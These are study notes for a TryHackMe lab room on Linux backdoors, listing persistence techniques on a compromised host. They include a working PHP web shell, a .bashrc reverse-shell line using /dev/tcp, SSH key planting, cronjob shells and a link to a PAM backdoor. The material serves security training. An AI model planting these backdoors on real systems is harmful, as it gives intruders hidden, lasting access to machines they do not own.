# Room
https://tryhackme.com/room/linuxbackdoors

# Task 1 - Intro
A backdoor ensures consistent access to the compromised machine

# Task 2 - SSH Backdoors
SSH backdoors - leave SSH keys in a user's home directory

* Example
  * generate keys
    * ssh-keygen
  * copy keys
    * ssh-copy-id
  * using the keys
    * ssh -i keyname user@host

# Task 3 - PHP Backdoors
Example malicious PHP file

```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

# Task 4 - CronJob Backdoors
Create a cronjob that will run a script that sends a reverse shell or another malicious action

# Task 5 - .bashrc Backdoors
Edit the user .bashrc file and place a reverse shell in it

```
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

# Task 6 - pam_unix.so Backdoors
Example
* https://github.com/zephrax/linux-pam-backdoor